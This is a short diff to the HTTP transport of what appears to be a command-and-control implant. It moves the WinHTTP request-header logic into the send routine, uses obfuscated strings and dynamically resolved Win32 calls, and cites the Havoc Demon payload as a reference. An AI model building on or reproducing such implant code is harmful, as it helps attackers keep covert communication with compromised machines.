@@ -4,9 +4,6 @@ namespace Http {
     BOOL SetHeaders(_request *request) {
         HEXANE
 
-        bool success = true;
-        wchar_t *header = { };
-        uint32_t n_headers = 0;
 
         if (Ctx->Transport.http->headers) {
 
@@ -36,10 +33,10 @@ namespace Http {
             if (!(Ctx->win32.WinHttpQueryDataAvailable(request->req_handle, R_CAST(LPDWORD, &length)))) {
                 return_defer(ntstatus);
             }
-
             if (!buffer) {
                 buffer = x_malloc(length + 1);
             }
+
             if (!download) {
                 download = x_malloc(length + 1);
             } else {
@@ -189,9 +186,12 @@ namespace Http {
         HEXANE
         // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L21
 
-        _proxy_context *proxy_ctx = { };
-        _request *request   = { };
+        _proxy_context *proxy_ctx   = { };
+        _request *request           = { };
+
+        wchar_t *header     = { };
         uint32_t status     = 0;
+        uint32_t n_headers  = 0;
         uint32_t n_status   = sizeof(uint32_t);
 
         Ctx->Transport.http->method = OBFW(L"GET"); // todo: dynamic method selection/context-based?
@@ -213,6 +213,18 @@ namespace Http {
                 return_defer(ntstatus);
             }
         }
+
+        if (Ctx->Transport.http->headers) {
+            // a pointless macro but it looks nicer/slightly less typing
+            DYN_ARRAY_EXPR(
+                n_headers, Ctx->Transport.http->headers,
+                header = Ctx->Transport.http->headers[n_headers];
+
+            if (!Ctx->win32.WinHttpAddRequestHeaders(request->req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+                return_defer(ntstatus);
+            })
+        }
+
         if (
             !Ctx->win32.WinHttpSendRequest(request->req_handle, nullptr, 0, out->Buffer, out->Length, out->Length, 0) ||
             !Ctx->win32.WinHttpReceiveResponse(request->req_handle, nullptr)) {
